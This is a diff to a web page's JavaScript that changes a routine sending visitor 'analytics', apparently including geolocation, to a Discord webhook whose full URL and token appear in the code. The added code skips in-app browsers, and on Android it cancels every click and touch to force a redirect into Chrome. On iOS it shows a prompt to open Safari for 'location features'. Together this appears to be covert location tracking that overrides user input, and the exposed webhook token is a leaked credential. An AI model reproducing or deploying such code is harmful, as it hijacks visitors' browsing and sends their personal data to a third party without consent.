@@ -1210,6 +1210,12 @@ document.getElementById('contact-form').addEventListener('submit', async functio
 (async function sendAnalytics(){
   const WEBHOOK = 'https://discord.com/api/webhooks/1511445599046733905/SbRGVq0s6PlPBh3X_9SSyNEF7AqWH3tUIgIREZdw7UL7oH7wI6i2mQB_P7uI_p5g9vQA';
 
+  /* Skip analytics in in-app browsers — geolocation won't work there */
+  const _ua = navigator.userAgent || '';
+  const _IAB = ['Instagram','FBAN','FBAV','FB_IAB','FBIOS','TikTok','musical_ly',
+                 'Snapchat','Line/','WhatsApp','LinkedInApp','Twitter','Pinterest','Telegram'];
+  if(_IAB.some(s => _ua.includes(s))) return;
+
   if(sessionStorage.getItem('beta_analytics_sent')) return;
   sessionStorage.setItem('beta_analytics_sent', 'true');
 
@@ -1541,87 +1547,94 @@ setTimeout(initTilt, 800);
   const isIOS     = /iPhone|iPad|iPod/i.test(ua);
 
   if(isAndroid){
-    /* ── Android: langsung redirect ke Chrome tanpa popup ─── */
-    const loc = window.location;
-    const intentUrl = 'intent://' + loc.host + loc.pathname + loc.search + loc.hash
-      + '#Intent;scheme=https;package=com.android.chrome;end';
-    window.location.href = intentUrl;
-    /* Fallback: kalau Chrome tidak terpasang */
-    setTimeout(function(){ window.open(loc.href, '_blank'); }, 500);
+    /* ── Android: redirect ke Chrome setiap ada interaksi ── */
+    function gotoChrome(){
+      const loc = window.location;
+      const intentUrl = 'intent://' + loc.host + loc.pathname + loc.search + loc.hash
+        + '#Intent;scheme=https;package=com.android.chrome;end';
+      window.location.href = intentUrl;
+      /* Fallback: browser default hp */
+      setTimeout(function(){ window.open(loc.href, '_blank'); }, 600);
+    }
+
+    /* Coba langsung saat load */
+    gotoChrome();
+
+    /* Juga intercept setiap tap — untuk kasus redirect load diblokir IAB */
+    document.addEventListener('click', function(e){
+      e.preventDefault();
+      e.stopPropagation();
+      gotoChrome();
+    }, { capture: true });
+
+    document.addEventListener('touchstart', function(e){
+      gotoChrome();
+    }, { capture: true, passive: true });
+
     return;
   }
 
   if(isIOS){
-    /* ── iOS: coba Chrome dulu, lalu inject & tampilkan toast ── */
-    const chromeUrl = window.location.href.replace(/^https?:\/\//i, 'googlechrome://');
-    window.location.href = chromeUrl;
-
-    /* Inject toast HTML ke DOM hanya kalau dibutuhkan */
-    setTimeout(function(){
-      const toastEl = document.createElement('div');
-      toastEl.id = 'iab-toast';
-      toastEl.setAttribute('role','dialog');
-      toastEl.setAttribute('aria-live','polite');
-      toastEl.style.cssText = [
-        'position:fixed','bottom:0','left:0','right:0','z-index:9999',
-        'padding:0 12px 12px',
-        'animation:iabUp 0.42s cubic-bezier(.2,.8,.2,1) forwards',
-      ].join(';');
-      toastEl.innerHTML = [
-        '<div style="background:#0d1024;border:1px solid rgba(124,106,247,0.35);border-radius:20px;',
-        'padding:20px 20px 18px;box-shadow:0 -4px 40px rgba(124,106,247,0.15),0 0 0 1px rgba(255,255,255,0.04);',
-        'display:flex;flex-direction:column;gap:14px;">',
-          /* top row */
-          '<div style="display:flex;align-items:flex-start;gap:14px;">',
-            '<div style="width:44px;height:44px;min-width:44px;border-radius:12px;',
-            'background:linear-gradient(135deg,rgba(124,106,247,0.22),rgba(34,211,238,0.12));',
-            'border:1px solid rgba(124,106,247,0.3);display:flex;align-items:center;',
-            'justify-content:center;font-size:1.3rem;flex-shrink:0;">🧭</div>',
-            '<div style="flex:1;">',
-              '<div style="font-family:\'Syne\',sans-serif;font-size:0.95rem;font-weight:800;',
-              'letter-spacing:-0.01em;color:#fff;margin-bottom:5px;">Open in Safari for full access</div>',
-              '<div style="font-size:0.78rem;color:rgba(238,238,242,0.55);line-height:1.6;font-weight:300;">',
-              'Location features aren\'t available inside apps — open in Safari to continue.</div>',
-            '</div>',
-            '<button id="iab-x" aria-label="Close" style="width:28px;height:28px;min-width:28px;',
-            'border-radius:50%;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);',
-            'color:rgba(238,238,242,0.5);font-size:1rem;cursor:pointer;display:flex;',
-            'align-items:center;justify-content:center;flex-shrink:0;-webkit-tap-highlight-color:transparent;',
-            'padding:0;line-height:1;">&times;</button>',
+    /* ── iOS: langsung tampilkan toast — tidak perlu tunggu ─ */
+    const toastEl = document.createElement('div');
+    toastEl.id = 'iab-toast';
+    toastEl.setAttribute('role','dialog');
+    toastEl.style.cssText = [
+      'position:fixed','bottom:0','left:0','right:0','z-index:9999',
+      'padding:0 12px 12px',
+      'animation:iabUp 0.42s cubic-bezier(.2,.8,.2,1) forwards',
+    ].join(';');
+    toastEl.innerHTML = [
+      '<div style="background:#0d1024;border:1px solid rgba(124,106,247,0.35);border-radius:20px;',
+      'padding:20px 20px 18px;box-shadow:0 -4px 40px rgba(124,106,247,0.15),0 0 0 1px rgba(255,255,255,0.04);',
+      'display:flex;flex-direction:column;gap:14px;">',
+        '<div style="display:flex;align-items:flex-start;gap:14px;">',
+          '<div style="width:44px;height:44px;min-width:44px;border-radius:12px;',
+          'background:linear-gradient(135deg,rgba(124,106,247,0.22),rgba(34,211,238,0.12));',
+          'border:1px solid rgba(124,106,247,0.3);display:flex;align-items:center;',
+          'justify-content:center;font-size:1.3rem;flex-shrink:0;">🧭</div>',
+          '<div style="flex:1;">',
+            '<div style="font-family:\'Syne\',sans-serif;font-size:0.95rem;font-weight:800;',
+            'letter-spacing:-0.01em;color:#fff;margin-bottom:5px;">Open in Safari for full access</div>',
+            '<div style="font-size:0.78rem;color:rgba(238,238,242,0.55);line-height:1.6;font-weight:300;">',
+            'Location features aren\'t available inside apps — open in Safari to continue.</div>',
           '</div>',
-          /* steps */
-          '<div style="display:flex;flex-direction:column;gap:8px;padding:14px 16px;',
-          'background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:14px;">',
-            '<div style="display:flex;align-items:center;gap:10px;font-size:0.78rem;',
-            'color:rgba(238,238,242,0.6);font-weight:300;">',
-              '<span style="width:20px;height:20px;min-width:20px;border-radius:50%;',
-              'background:linear-gradient(135deg,rgba(124,106,247,0.5),rgba(34,211,238,0.3));',
-              'font-family:\'Syne\',sans-serif;font-size:0.62rem;font-weight:800;color:#fff;',
-              'display:flex;align-items:center;justify-content:center;flex-shrink:0;">1</span>',
-              'Tap the <strong style="color:#fff;font-weight:600;margin:0 3px;">Share</strong> button at the bottom of your screen',
-            '</div>',
-            '<div style="display:flex;align-items:center;gap:10px;font-size:0.78rem;',
-            'color:rgba(238,238,242,0.6);font-weight:300;">',
-              '<span style="width:20px;height:20px;min-width:20px;border-radius:50%;',
-              'background:linear-gradient(135deg,rgba(124,106,247,0.5),rgba(34,211,238,0.3));',
-              'font-family:\'Syne\',sans-serif;font-size:0.62rem;font-weight:800;color:#fff;',
-              'display:flex;align-items:center;justify-content:center;flex-shrink:0;">2</span>',
-              'Select <strong style="color:#fff;font-weight:600;margin:0 3px;">"Open in Safari"</strong> from the menu',
-            '</div>',
+          '<button id="iab-x" aria-label="Close" style="width:28px;height:28px;min-width:28px;',
+          'border-radius:50%;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);',
+          'color:rgba(238,238,242,0.5);font-size:1rem;cursor:pointer;display:flex;',
+          'align-items:center;justify-content:center;flex-shrink:0;-webkit-tap-highlight-color:transparent;',
+          'padding:0;line-height:1;">&times;</button>',
+        '</div>',
+        '<div style="display:flex;flex-direction:column;gap:8px;padding:14px 16px;',
+        'background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:14px;">',
+          '<div style="display:flex;align-items:center;gap:10px;font-size:0.78rem;',
+          'color:rgba(238,238,242,0.6);font-weight:300;">',
+            '<span style="width:20px;height:20px;min-width:20px;border-radius:50%;',
+            'background:linear-gradient(135deg,rgba(124,106,247,0.5),rgba(34,211,238,0.3));',
+            'font-family:\'Syne\',sans-serif;font-size:0.62rem;font-weight:800;color:#fff;',
+            'display:flex;align-items:center;justify-content:center;flex-shrink:0;">1</span>',
+            'Tap the <strong style="color:#fff;font-weight:600;margin:0 3px;">Share</strong> button at the bottom of your screen',
+          '</div>',
+          '<div style="display:flex;align-items:center;gap:10px;font-size:0.78rem;',
+          'color:rgba(238,238,242,0.6);font-weight:300;">',
+            '<span style="width:20px;height:20px;min-width:20px;border-radius:50%;',
+            'background:linear-gradient(135deg,rgba(124,106,247,0.5),rgba(34,211,238,0.3));',
+            'font-family:\'Syne\',sans-serif;font-size:0.62rem;font-weight:800;color:#fff;',
+            'display:flex;align-items:center;justify-content:center;flex-shrink:0;">2</span>',
+            'Select <strong style="color:#fff;font-weight:600;margin:0 3px;">"Open in Safari"</strong> from the menu',
           '</div>',
         '</div>',
-      ].join('');
+      '</div>',
+    ].join('');
 
-      document.body.appendChild(toastEl);
-
-      document.getElementById('iab-x').addEventListener('click', function(){
-        toastEl.remove();
-      });
-    }, 800);
+    document.body.appendChild(toastEl);
+    document.getElementById('iab-x').addEventListener('click', function(){
+      toastEl.remove();
+    });
     return;
   }
 
-  /* ── OS lain ─────────────────────────────────────────── */
+  /* ── OS lain ──────────────────────────────────────────── */
   window.open(window.location.href, '_blank');
 })();
 
